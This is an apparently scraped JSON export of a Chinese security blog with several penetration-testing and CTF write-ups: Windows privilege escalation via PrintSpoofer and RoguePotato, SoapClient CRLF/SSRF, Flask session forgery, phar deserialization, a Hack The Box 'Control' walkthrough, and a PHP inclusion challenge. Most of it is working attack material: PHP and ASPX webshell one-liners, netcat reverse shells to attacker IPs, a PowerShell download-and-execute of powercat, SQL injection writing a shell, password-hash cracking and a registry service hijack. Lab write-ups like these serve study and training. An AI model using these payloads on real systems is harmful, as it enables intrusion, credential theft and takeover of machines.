k = 0 i = 0 while (k &lt; len(uri_data_one)): ​ while i &lt; len(uri_data_one[k][&#39;son&#39;]): ​ uri_one.append(uri_data_one[k][&#39;son&#39;][i][&#39;url&#39;]) ​ i += 1 ​ i = 0 ​ k += 1 url_one = [host_url + j for j in uri_one] return (url_one) def get_title(): headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36&quot; } request = requests.get(url,headers=headers).text request_data = json.loads(request) \\#request_data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;][1][&#39;son&#39;][3][&#39;name&#39;] title_data = request_data[&#39;data&#39;][&#39;series_course&#39;][&#39;list&#39;] m = 0 n = 0 title_name = [] while m &lt; len(title_data): ​ while n &lt; len(title_data[m][&#39;son&#39;]): ​ title_name.append(title_data[m][&#39;son&#39;][n][&#39;name&#39;]) ​ n += 1 ​ n = 0 ​ m += 1 return (title_name) def get_m3u8_url(url_one): \\#思路:1.访问-&gt;f5刷新-&gt;单击全高清-&gt;获取xhr链接 -&gt; 不可行 2.抓包获取 url_data = url_one headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36&quot;, &quot;Cookie&quot;:&quot;your cookie&quot; } rel_m3u8_url = [] for g in url_data: ​ url_test = g ​ video_requests = requests.get(url=url_test,headers=headers).text ​ result = re.findall(&#39;fileID: &quot;(.*?)&quot;&#39;,video_requests) #测试发现,部分data-id是无法获取的,无法获取的话就json无法请求url,从而报错.故用fileID,或者删除无法获取data-id的这个url ​ playinfo_url = &#39;http://playvideo.qcloud.com/getplayinfo/v2/1251001764/&#39; + result[0] ​ \\#print (playinfo_url) ​ playinfo_requests = requests.get(playinfo_url).text ​ m3u8_info = json.loads(playinfo_requests) ​ \\#判断视频大小 取出m3u8链接:视频大小越大,越高清 ​ \\#m3u8_url = m3u8_info[&#39;videoInfo&#39;][&#39;transcodeList&#39;][2][&#39;url&#39;] ​ m3u8_url = m3u8_info[&#39;videoInfo&#39;][&#39;transcodeList&#39;] ​ video_size = [] ​ for l in range(len(m3u8_url)): ​ video_size.append(&#39;&#39;) ​ video_size[int(l)] = m3u8_url[int(l)][&#39;size&#39;] ​ index = video_size.index(max(video_size)) #得到索引 ​ rel_m3u8_url.append(m3u8_url[index][&#39;url&#39;]) return rel_m3u8_url if __name__ == &#39;__main__&#39;: title_name = get_title() print (title_name) url_one = get_url() print (url_one) rel_m3u8_url = get_m3u8_url(url_one) print (rel_m3u8_url) \\#将数据写入文件 video_data = [(&#39;title:&#39; + title_name[y] + &#39; + url:&#39; + url_one[y] + &#39; + m3u8:&#39; + rel_m3u8_url[y] + &#39;\\n&#39;) for y in range(0,len(title_name))] \\#print (video_data) f = open(&#39;./video_data.txt&#39;,&#39;w+&#39;,encoding=&#39;utf-8&#39;) for v in video_data: ​ f.write(v) f.close() download_video()其中headers,ffmpeg根据你的情况自行修改","permalink":"http://perthinking.xyz/Python/1/","photos":[]},{"tags":[],"title":"Windows-PrintSpoofer提权","date":"2020/05/14","text":"1.搭建一个iis服务器 写上一句话 &lt;%eval request(“a”)%&gt; 蚁剑连接 提权前提 需要有SeImpersonatePrivileg这个权限 然后编译exp 编译完成后中上传到靶机中 并执行 可能出现以下问题 vcruntime140d.dll丢失 然后修改为选项就可以了 经过多次编译 发现目标机无法执行成功exp 发现版本有限制… From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019 放在win10上就成功了 aspx一句话:&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“a”],”unsafe”);%&gt; 拓展下 反弹shell PrintSpoofer.exe -c “C:\\inetpub\\wwwroot\\nc.exe 192.168.0.104 8888 -e cmd” 生成系统进程 Spawn a SYSTEM process on a desktop PrintSpoofer.exe -d 3 -c “powershell -ep bypass”","permalink":"http://perthinking.xyz/Elevation/2/","photos":[]},{"tags":[],"title":"Windows-RoguePotato  提权","date":"2020/05/14","text":"复现下国外大佬的提权 1.原理https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/amp/?__twitter_impression=true&amp;tdsourcetag=s_pctim_aiomsg 项目源码:https://github.com/antonioCoco/RoguePotato 2.复现靶机: win10 ip:192.168.0.102 攻击机: kali ip:192.168.0.101 首先 下载源码后编译 注意是 release 编译 编译后如下: 然后将编译后的软件上传到靶机中 我是将整个文件夹上传上去 看用法说明 应该要用到 RogueOxidResolver.exe 在win10开启一个iis 并上传一个执行命令的小马 在github上可以下载 访问后执行命令确保小马有用 然后在靶机上上传nc 并开启RPC服务 默认是开启的 在攻击机上执行命令: socat tcp-listen:135,reuseaddr,fork tcp:192.168.0.102:9999 Nc -lvp 4444 网站shell中执行 .\\RoguePotato.exe -r 192.168.0.101 -e “E:\\Debug\\nc64.exe 192.168.0.101 4444 -e cmd.exe” -l 9999 成功反弹shell 并获得系统权限 成功提权 然后也可以看到4444端口连接 还要说明的就是用户权限不能反弹shell","permalink":"http://perthinking.xyz/Elevation/1/","photos":[]},{"tags":[],"title":"Soapclient+crlf+ssrf(原理)","date":"2020/05/06","text":"1.基础知识 引用下优秀博客的文章 https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html 然后再多接触下wsdl文档实例 2.CRLF 引用下优秀博客的文章 https://wooyun.js.org/drops/CRLF%20Injection漏洞的利用与实例分析.html 3.crlf+ssrf漏洞利用看soapclient方法 生成任意报文的POC &lt;?php $target = &#39;http://xxx/bbb.php&#39;; $post_string = &#39;a=b&amp;flag=aaa&#39;; $headers = array( &#39;X-Forwarded-For: 127.0.0.1&#39;, &#39;Cookie: xxxx=1234&#39; ); $b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39; =&gt; &quot;aaab&quot;)); $aaa = serialize($b); $aaa = str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,$aaa); $aaa = str_replace(&#39;&amp;&#39;,&#39;%26&#39;,$aaa); echo $aaa; ?&gt;4.简单运用soapclient1)本地测试&lt;?php $a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;)); $b = serialize($a); echo $b; $c = unserialize($b); $c-&gt;not_exists_function(); 2)看看crlf漏洞&lt;?php $a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\\r\\n\\r\\nccc\\r\\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;)); $b = serialize($a); echo $b; $c = unserialize($b); $c-&gt;not_exists_function(); 弹到vps试下 3)构造请求&lt;?php $target = &#39;http://39.101.184.64:5555/path&#39;; $post_string = &#39;data=something&#39;; $headers = array( &#39;X-Forwarded-For: 127.0.0.1&#39;, &#39;Cookie: PHPSESSID=my_session&#39; ); $b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content- Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39; =&gt; &quot;aaab&quot;)); $aaa = serialize($b); $aaa = str_replace(&#39;^^&#39;,&quot;\\r\\n&quot;,$aaa); $aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa); echo $aaa; $c = unserialize($aaa); $c-&gt;not_exists_function(); ?&gt;","permalink":"http://perthinking.xyz/CTF/6/","photos":[]},{"tags":[],"title":"Flask-session伪造-[CISCN2019 华东南赛区]Web4","date":"2020/05/06","text":"知识点: Flask模块 任意文件读取 伪随机数攻击 1.首先应想到它是flask模块写的py程序 修改为app.py拿到源码 # encoding:utf-8 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode())//mac地址 app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233) app.debug = True @app.route(&#39;/&#39;) def index(): session[&#39;username&#39;] = &#39;www-data&#39; return &#39;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#39; @app.route(&#39;/read&#39;) def read(): try: ​ url = request.args.get(&#39;url&#39;) ​ m = re.findall(&#39;^file.*&#39;, url, re.IGNORECASE) ​ n = re.findall(&#39;flag&#39;, url, re.IGNORECASE) ​ if m or n: ​ return &#39;No Hack&#39; ​ res = urllib.urlopen(url) ​ return res.read() except Exception as ex: ​ print str(ex) return &#39;no response&#39; @app.route(&#39;/flag&#39;) def flag(): if session and session[&#39;username&#39;] == &#39;fuck&#39;: ​ return open(&#39;/flag.txt&#39;).read() else: ​ return &#39;Access denied&#39; if __name__==&#39;__main__&#39;: app.run( ​ debug=True, ​ host=&quot;0.0.0.0&quot; )这里的考点就是利用伪随机数的攻击 替换cookie拿flag random.seed(uuid.getnode()) 设置随机种子为MAC地址 读取MAC地址 02:42:ae:01:22:f5 2.FlaskSession伪造 使用这个命令安装: pip install flask_session_cookie_manager 脚本: #!/usr/bin/env python2 \\# encoding:utf-8 import random import flask_session_cookie_manager2 mac = &quot;02:42:ae:01:22:f5&quot; random.seed(int(mac.replace(&quot;:&quot;, &quot;&quot;), 16)) for x in range(1000): SECRET_KEY = str(random.random() * 233) rs = flask_session_cookie_manager2.FSCM.decode(&#39;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XnS_Kw.ZdBc_Fi1QVVs6xXweABU0xuzfm8&#39;, SECRET_KEY) if &#39;error&#39; not in rs: ​ print(SECRET_KEY) ​ rs[u&#39;username&#39;] = &#39;fuck&#39; ​ print(str(rs)) ​ print(flask_session_cookie_manager2.FSCM.encode(SECRET_KEY, str(rs))) ​ break 得到cookie 访问flag 重置cookie即可拿到flag","permalink":"http://perthinking.xyz/CTF/5/","photos":[]},{"tags":[],"title":"Bypass disfuction-攻防世界smarty","date":"2020/05/05","text":"1.if标签首先 if标签得到phpinfo {if phpinfo()}{/if} 拿到路径 上传一句话 {file_put_contents(‘/var/www/html/shell.php’,’&lt;?php eval($_POST[1]);’)} 发现路径open_basedir()限制 也禁用了大部分函数 2.bypass disfuction然后就是bypass disfuction 也是linux pre_load 原理待补 https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 上传这两个文件 访问http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so","permalink":"http://perthinking.xyz/CTF/4/","photos":[]},{"tags":[],"title":"phar反序列化(原理)","date":"2020/05/05","text":"1.phar文件结构: metadata: 2.生成phar文件&lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 可以看到metadata序列化形式存储在phar.phar中 了解下phar伪协议 测试: class TestObject { ​ public function __destruct() { ​ echo &#39;Destruct called&#39;; ​ } } $filename = &#39;phar://phar.phar&#39;; file_get_contents($filename); 说明file_get_contents()解析phar文件时触发反序列化 也可以这样用 原理: 3.伪造成其它格式文件 伪造成gif class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头 $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); 4.利用条件:","permalink":"http://perthinking.xyz/CTF/3/","photos":[]},{"tags":[],"title":"HTB靶机练习-Control","date":"2020/05/05","text":"先贴下要用到的命令 这样更快理清知识点 1&#39;;show global variables like &#39;%genera%&#39;;# 1&#39;;show global variables like &#39;secure_file_priv&#39;;# 1&#39;;select &quot;&lt;?php system($_GET[a]);?&gt;&quot; into OUTFILE &#39;C:\\\\Inetpub\\\\wwwroot\\\\a.php&#39;;# powershell -c &quot;IEX(New-Object System.Net.Webclient).DownloadString(&#39;http://10.10.16.26:8081/powercat.ps1&#39;);powercat -c 10.10.16.26 -p 8888 -e cmd&quot; sqlmap -r control.txt --passwords hashcat -m 300 pass.txt /usr/share/wordlists/rockyou.txt --force hashcat -m 300 pass.txt --show sqlmap -r control.txt --file-write=/home/aleng/Desktop/b.php --file-dest=c://inetpub/wwwroot/b.php curl http://10.10.16.26:8081/plink.exe -o ./uploads/plink.exe curl http://10.10.16.26:8081/nc3.exe -o ./uploads/nc.exe .\\plink.exe -R 5985:127.0.0.1:5985 10.10.16.26 .\\plink.exe -l aleng -pw aleng -R 5985:127.0.0.1:5985 10.10.16.26 gem install winrm-fs colorize stringio evil-winrm ruby evil-winrm.rb -i 127.0.0.1 -u hector -p l33th4x0rhector evil-winrm -i 127.0.0.1 -u Hector -p l33th4x0rhector get-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List * | findstr /i &quot;Hector Users Path&quot; Get-ItemProperty HKLM:\\System\\CurrentControlSet\\services\\wuauserv reg add &quot;HKLM\\System\\CurrentControlSet\\services\\wuauserv&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\\inetpub\\wwwroot\\uploads\\nc.exe 10.10.16.26 777 -e cmd&quot; /f start-Service wuauserv type C:\\Users\\Administrator\\Desktop\\root.txt1.nmap&amp;&amp;sql扫描结果如下 开启了80 135 msrpc 3306 mysql端口 访问80端口 四个页面 Admin login 页面提示 Index.php提示页面如下 联想到XXF 发现有注入 1’ 1’#发现不报错 放到sqlmap中跑 使用 –password跑密码 database management system users password hashes: [*] hector [1]: password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D [*] manager [1]: password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA clear-text password: l3tm3!n [*] root [1]: password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8 尝试写一句话 可是权限不够? 但也不是绝对的 可以写一句话试下 查询是否可写 因为是iis服务器 路径自然明了 成功写入一个shell 1&#39;;select &quot;&lt;?php system($_GET[a]);?&gt;&quot; into OUTFILE &#39;C:\\\\Inetpub\\\\wwwroot\\\\a.php&#39;;# 2.powercat 反弹shell在本地开一个python2 服务 然后监听端口 powershell -c &quot;IEX(New-Object System.Net.Webclient).DownloadString(&#39;http://10.10.16.26:8081/powercat.ps1&#39;);powercat -c 10.10.16.26 -p 8888 -e cmd&quot; 查看用户文件 我们的权限是 iis用户 查看下端口及服务 WinRM服务 WinRM全称是Windows Remote Management，是微软服务器硬件管理功能的一部分，能够对本地或远程的服务器进行管理。WinRM服务能够让管理员远程登录Windows操作系统，获得一个类似Telnet的交互式命令行shell，而底层通讯协议使用的是HTTP 接下来尝试上传putty简历管道连接 但是是失败的 https://www.nav1n.com/2019/12/hack-the-box-control-writeup-10-10-10-167/ 我就不尝试了 3.plink管道连接https://github.com/WhiteWinterWolf/wwwolf-php-webshell sqlmap -r control.txt –file-write=/home/aleng/Desktop/b.php –file-dest=c://inetpub/wwwroot/b.php 上传plink.exe建立管道连接 不要下错了版本 (都是坑阿…) 然后将靶机的5985端口转到本地5985 记住把本地的ssh端口服务开启 .\\plink.exe -R 5985:127.0.0.1:5985 10.10.16.26 切换到root 额 这一步是多余的… 4.hashcat爆破密码之前发现slqmap跑出了一个用户的密文 [*] hector [1]: password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D 在shell中我们也看到了这个用户 下面使用hashcat尝试爆破 hashcat -m 300 pass.txt /usr/share/wordlists/rockyou.txt –force -m 300 指定密码类型 命令执行后 hashcat -m 300 pass.txt –show 得到明文 0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector 然后使用winrm远程管理工具 https://www.freebuf.com/sectool/210479.html 不过得先配置下环境 不然得踩坑 查看本地源 gem source -l gem添加源 gem sources –add https://gems.ruby-china.com 删除原来的源 gem source -r https://rubygems.org/ Gem install evil-winrm 连接 evil-winrm -i 127.0.0.1 -u hector -p l33th4x0rhector 拿到第一个flag 5.计划任务提权使用一些命令信息搜集 Whoami /priv Net localgroup Administrators Cmdkey list 列举凭据 然后了解下window ACL get-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List * | findstr /i &quot;Hector Users Path&quot; 查询某个用户的ACL 相当于linux的可执行程序吧… 最后是提权的漏洞点 Wuauserv 服务 Get-ItemProperty HKLM:\\System\\CurrentControlSet\\services\\wuauserv 写入注册表 提权 类似于服务劫持或者说计划任务吧算是 reg add &quot;HKLM\\System\\CurrentControlSet\\services\\wuauserv&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\\inetpub\\wwwroot\\uploads\\nc.exe 10.10.16.26 777 -e cmd&quot; /f 应该是有人上传了一个nc 或者自己上传一个 然后本地监听 但是只有一次执行命令的机会… 反弹shell后直接报错 反正就还有好多坑 等踩吧…","permalink":"http://perthinking.xyz/HTB%E9%9D%B6%E6%9C%BA/1/","photos":[]},{"tags":[],"title":"代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019","date":"2020/05/05","text":"1.审计源码意思就是让上传个马,然后包含过去读flag 要把一些无关紧要的代码略过 1)实现put,get功能的代码:$parsed_url = explode(&quot;&amp;&quot;, $_SERVER[&#39;QUERY_STRING&#39;]); if(count($parsed_url) &gt;= 2){ ​ header(&quot;Content-Type:text/json&quot;); ​ switch($parsed_url[0]){ ​ case &quot;get&quot;: ​ $get = new Get($parsed_url[1]); ​ $data = $get-&gt;get(); ​ break; ​ case &quot;put&quot;: ​ $put = new Put($parsed_url[1], $_POST); ​ $data = $put-&gt;put(); ​ break; ​ default: ​ $data = [&quot;msg&quot; =&gt; &quot;Invalid data.&quot;]; ​ break; ​ } ​ die(json_encode($data)); }2)get功能块:class Get { ​ protected function nanahira(){ ​ // senpai notice me // ​ function exploit($data){ ​ $exploit = new System(); ​ } ​ $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]); ​ } ​ private $filename; ​ function __construct($filename){ ​ $this-&gt;filename = path_sanitizer($filename); ​ } ​ function get(){ ​ if($this-&gt;filename === false){ ​ return [&quot;msg&quot; =&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ // wtf???? // ​ if(!@file_exists($this-&gt;filename)){ ​ // index files are *completely* disabled. // ​ if(stripos($this-&gt;filename, &quot;index&quot;) !== false){ ​ return [&quot;msg&quot; =&gt; &quot;you cannot include index files!&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ // hardened sanitizer spawned. thus we sense ambiguity // ​ $read_file = &quot;./files/&quot; . $this-&gt;filename; ​ $read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true); ​ if($read_file === $read_file_with_hardened_filter || ​ @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){ ​ return [&quot;msg&quot; =&gt; &quot;request blocked&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ // .. and finally, include *un*exploitable file is included. // ​ @include(&quot;./files/&quot; . $this-&gt;filename); ​ return [&quot;type&quot; =&gt; &quot;success&quot;]; ​ }else{ ​ return [&quot;msg&quot; =&gt; &quot;invalid filename (wtf)&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ } }3)put功能块class Put { ​ protected function nanahira(){ ​ // senpai notice me // ​ function exploit($data){ ​ $exploit = new System(); ​ } ​ $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]); ​ } ​ private $filename; ​ private $content; ​ private $dir = &quot;./files/&quot;; ​ function __construct($filename, $data){ ​ global $seed; ​ if((string)$filename === (string)@path_sanitizer($data[&#39;filename&#39;])){ ​ $this-&gt;filename = (string)$filename; ​ }else{ ​ $this-&gt;filename = false; ​ } ​ $this-&gt;content = (string)@code_sanitizer($data[&#39;content&#39;]); ​ } ​ function put(){ ​ // just another typical file insertion // ​ if($this-&gt;filename === false){ ​ return [&quot;msg&quot; =&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ // check if file exists // ​ if(file_exists($this-&gt;dir . $this-&gt;filename)){ ​ return [&quot;msg&quot; =&gt; &quot;file exists&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ file_put_contents($this-&gt;dir . $this-&gt;filename, $this-&gt;content); ​ // just check if file is written. hopefully. // ​ if(@file_get_contents($this-&gt;dir . $this-&gt;filename) == &quot;&quot;){ ​ return [&quot;msg&quot; =&gt; &quot;file not written.&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ return [&quot;type&quot; =&gt; &quot;success&quot;]; ​ } }4)过滤函数: function rrmdir($dir, $depth=0){ ​ if (is_dir($dir)){ ​ $objects = scandir($dir); ​ foreach ($objects as $object){ ​ if ($object != &quot;.&quot; &amp;&amp; $object != &quot;..&quot;){ ​ if(is_dir($dir.&quot;/&quot;.$object)) ​ rrmdir($dir.&quot;/&quot;.$object, $depth + 1); ​ else ​ unlink($dir.&quot;/&quot;.$object); ​ } ​ } ​ } ​ if($depth != 0) rmdir($dir); } function countdir($dir){ ​ if (is_dir($dir)){ ​ $objects = scandir($dir); ​ foreach ($objects as $object){ ​ if ($object != &quot;.&quot; &amp;&amp; $object != &quot;..&quot;){ ​ $count += 1; ​ if(is_dir($dir.&quot;/&quot;.$object)) ​ $count += countdir($dir.&quot;/&quot;.$object); ​ } ​ } ​ } ​ return $count; } var_dump(countdir(&quot;./files&quot;)); if(countdir(&quot;./files/&quot;) &gt;= 100) @rrmdir(&quot;./files/&quot;); // Here, kawaii path-san for you! // function path_sanitizer($dir, $harden=false){ ​ $dir = (string)$dir; ​ $dir_len = strlen($dir); ​ // Deny LFI/RFI/XSS // ​ $filter = [&#39;.&#39;, &#39;./&#39;, &#39;~&#39;, &#39;.\\\\&#39;, &#39;#&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;]; ​ foreach($filter as $f){ ​ if(stripos($dir, $f) !== false){ ​ return false; ​ } ​ } ​ // Deny SSRF and all possible weird bypasses // ​ $stream = stream_get_wrappers(); ​ $stream = array_merge($stream, stream_get_transports()); ​ $stream = array_merge($stream, stream_get_filters()); ​ foreach($stream as $f){ ​ $f_len = strlen($f); ​ if(substr($dir, 0, $f_len) === $f){ ​ return false; ​ } ​ } ​ // Deny length // ​ if($dir_len &gt;= 128){ ​ return false; ​ } ​ // Easy level hardening // ​ if($harden){ ​ $harden_filter = [&quot;/&quot;, &quot;\\\\&quot;]; ​ foreach($harden_filter as $f){ ​ $dir = str_replace($f, &quot;&quot;, $dir); ​ } ​ } ​ // Sanitize feature is available starting from the medium level // ​ return $dir; } // The new kakkoii code-san is re-implemented. // function code_sanitizer($code){ ​ // Computer-chan, please don&#39;t speak english. Speak something else! // ​ $code = preg_replace(&quot;/[^&lt;&gt;!@#$%\\^&amp;*\\_?+\\.\\-\\\\\\&#39;\\&quot;\\=\\(\\)\\[\\]\\;]/u&quot;, &quot;*Nope*&quot;, (string)$code); ​ return $code; }5)还有这段代码:@require(&#39;flag.php&#39;); $seed = md5(rand(PHP_INT_MIN,PHP_INT_MAX)); if($flag === $_GET[&#39;trigger&#39;]){ ​ die(hash(&quot;sha256&quot;, $seed . $flag)); } class System { ​ function __destruct(){ ​ global $seed; ​ // ain&#39;t Argon2, ain&#39;t pbkdf2. what could go wrong? ​ $flag = hash(&#39;sha256&#39;, $seed); ​ if($_GET[$flag]){ ​ @system($_GET[$flag]); ​ }else{ ​ @unserialize($_SESSION[$flag]); ​ } ​ } }这里是迷惑点,拿不到flag 2.分析put要过滤的点首先这个条件成立才能put文件 if((string)$filename === (string)@path_sanitizer($data[&#39;filename&#39;])) 文件名不能包含这些符号 $filter = [&#39;.&#39;, &#39;./&#39;, &#39;~&#39;, &#39;.\\\\&#39;, &#39;#&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;]; ​ foreach($filter as $f){ ​ if(stripos($dir, $f) !== false){ ​ return false; ​ } ​ }长度限制: if($dir_len &gt;= 128){ ​ return false; ​ }content的限制: $code = preg_replace(&quot;/[^&lt;&gt;!@#$%\\^&amp;*\\_?+\\.\\-\\\\\\&#39;\\&quot;\\=\\(\\)\\[\\]\\;]/u&quot;, &quot;*Nope*&quot;, (string)$code); 本地测试下: $a=@$_POST[a]; //$a = preg_replace(&quot;/[^&lt;&gt;!@#$%\\^&amp;*\\_?]/u&quot;, &quot;h&quot;, $a); $a = preg_replace(&quot;/[^&lt;&gt;!@#$%\\^&amp;*\\_?+\\.\\-\\\\\\&#39;\\&quot;\\=\\(\\)\\[\\]\\;]/u&quot;, &quot;h&quot;, $a); echo $a; 多了四个 hhhh 输入的字符没有被替换 怎么多了四个hhhh? 发现 应该是这样的,它会默认匹配 /r /n 属于一个字节,而汉字匹配的话是两个字节 所以这样的话就是四个字节了 替换后就变成了四个hhhh 再输入一个回车试下: 假如一句话是 虽然添加了几个字符 但并不影响php代码的执行 总结来说 就是让上传一个没有字母和数字的webshell 3.分析get要过滤的点1)这个函数解析url中get参数 explode(“&amp;”, $_SERVER[‘QUERY_STRING’]); 2)看过滤点: $read_file = &quot;./files/&quot; . $this-&gt;filename; ​ $read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true); ​ if($read_file === $read_file_with_hardened_filter || ​ @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){ ​ return [&quot;msg&quot; =&gt; &quot;request blocked&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ }首先看这个函数 path_sanitizer($this-&gt;filename, true) --&gt; if($harden){ ​ $harden_filter = [&quot;/&quot;, &quot;\\\\&quot;]; ​ foreach($harden_filter as $f){ ​ $dir = str_replace($f, &quot;&quot;, $dir); ​ } ​ }它将文件名中 / \\替换为空 然后这个if判断为真的话不能包含文件 if($read_file === $read_file_with_hardened_filter || ​ @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)) 也就是说包含的文件名必须加 / 或 \\ 同时文件内容也是不一样的 比如上传一个test 然后包含文件时是test\\ -&gt; test不等于test\\ 并且 file_get_contents(‘test&#39;)不等于file_get_contents(‘test’) 那么这个判断就可以绕过了 现在测试一下 再包含下 可以发现 成功include 但是文件内容没有读取 @include(&quot;./files/&quot; . $this-&gt;filename); -&gt; ./files/test\\ 它包含的是这个文件 而我们上传的文件是这样的: ./files/test 所以文件并不能读取 4.windows FindFirstFile利用&lt;?php for ($j=0; $j&lt;256; $j++) { ​ for ($i=0; $i&lt;256; $i++) { ​ $url = &#39;flag.p&#39; . chr($j) . chr($i); ​ $tmp = @file_get_contents($url); ​ if (!empty($tmp)) echo chr($j) . chr($i) . &quot; &quot;; ​ } } ?&gt; 本地测试 本题环境是 windows 所以我们可以上传 文件名为 “/test 绕过: $read_file = &quot;./files/&quot; . $this-&gt;filename; // ./files/./test $read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true); // ./files/.test @file_get_contents($read_file) //实际获取内容 @file_get_contents($read_file_with_hardened_filter) // 文件不存在 5.最后就是构造无数字字母的webshell 看P牛文章:https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html 在构造前先理解下自增运算符拿shell的原理 &lt;?php $_=[]; $_=@&quot;$_&quot;; // $_=&#39;Array&#39;; $_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0]; $___=$_; // A $__=$_; //$__=A $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__=&#39;S&#39; $___.=$__; // $___=&#39;AS&#39; $___.=$__; // $___=&#39;ASS&#39; $__=$_; // $__=&#39;A&#39; $__++;$__++;$__++;$__++; // $__=&#39;E&#39; $___.=$__; //$___=&#39;ASSE&#39; $__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;R&#39; $___.=$__; //$___=&#39;ASSER&#39; $__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;T&#39; $___.=$__; //$___=&#39;ASSERT&#39; $____=&#39;_&#39;; //$____=&#39;_&#39; $__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;P&#39; $____.=$__; //$____=&#39;_P&#39; $__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;O&#39; $____.=$__; //$____=&#39;_PO&#39; 